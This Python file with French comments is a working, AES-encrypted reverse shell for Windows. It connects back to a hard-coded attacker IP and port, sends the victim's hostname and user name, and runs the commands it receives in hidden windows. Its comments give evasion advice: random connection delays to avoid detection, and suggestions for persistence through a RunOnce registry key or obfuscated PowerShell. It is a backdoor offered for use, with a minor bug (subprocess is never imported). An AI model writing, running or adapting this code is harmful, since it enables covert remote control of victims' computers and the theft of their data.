import os
import sys
import base64
import socket
import time
import threading
import json
import random
from hashlib import sha256
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import ctypes

# --- Configuration ---
# MODIFIEZ CES VALEURS !
AES_KEY = b'CeciEstUneCle16o'  # Doit faire 16, 24 ou 32 octets
AES_IV = b'VoiciUnIVDe16Oct' # Doit faire 16 octets
HOST = '172.21.166.199'  # IP de l'attaquant
PORT = 4444            # Port de l'attaquant

def aes_encrypt(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
        return base64.b64encode(ct_bytes).decode('utf-8')
    except Exception:
        return None

def aes_decrypt(encoded_data):
    try:
        ct = base64.b64decode(encoded_data)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception:
        return None

def run_cmd(command):
    """Exécute une commande en utilisant cmd.exe via ctypes pour être plus discret."""
    try:
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return os.getcwd() + '>'
        else:
            # Utilisation de subprocess (plus stable que ctypes pour la capture de sortie)
            # On cache la fenêtre si possible
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.Popen(
                command, 
                shell=True, 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                startupinfo=startupinfo
            )
            output, error = result.communicate()
            return output + error
    except Exception as e:
        return f"Error: {e}\n"

def handle_connection(s):
    """Gère la communication."""
    try:
        # Infos système
        init_info = {
            "hostname": os.environ.get('COMPUTERNAME', 'Unknown'),
            "username": os.environ.get('USERNAME', 'Unknown'),
            "cwd": os.getcwd()
        }
        s.send(aes_encrypt(json.dumps(init_info)).encode('utf-8'))

        while True:
            # Timeout pour éviter d'être bloqué
            s.settimeout(60) 
            encrypted_cmd = s.recv(4096).decode('utf-8')
            
            if not encrypted_cmd:
                break
            
            command = aes_decrypt(encrypted_cmd)
            if command is None:
                continue
            
            if command.lower() == 'exit':
                s.close()
                sys.exit(0)
            
            output = run_cmd(command)
            encrypted_output = aes_encrypt(output)
            
            if encrypted_output:
                s.send(encrypted_output.encode('utf-8'))

    except socket.timeout:
        s.close()
    except Exception:
        s.close()

def main_loop():
    """Boucle principale avec délais aléatoires."""
    # La persistance a été retirée car c'est le principal point de détection.
    # Si vous voulez la persistance, vous devez l'implémenter via un autre moyen 
    # (ex: clé de registre RunOnce, ou via un script PowerShell obfusqué lancé manuellement).
    
    while True:
        try:
            # Délai aléatoire avant connexion pour éviter les patterns temporels
            sleep_time = random.randint(5, 15)
            time.sleep(sleep_time)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            
            # Une fois connecté, on passe la main à handle_connection
            handle_connection(s)
            
        except Exception:
            # En cas d'erreur (ex: connexion refusée), on attend un peu avant de retenter
            time.sleep(random.randint(30, 60))

if __name__ == "__main__":
    # Lancement en arrière-plan
    main_thread = threading.Thread(target=main_loop, daemon=True)
    main_thread.start()
    
    # Maintien du script en vie
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit(0)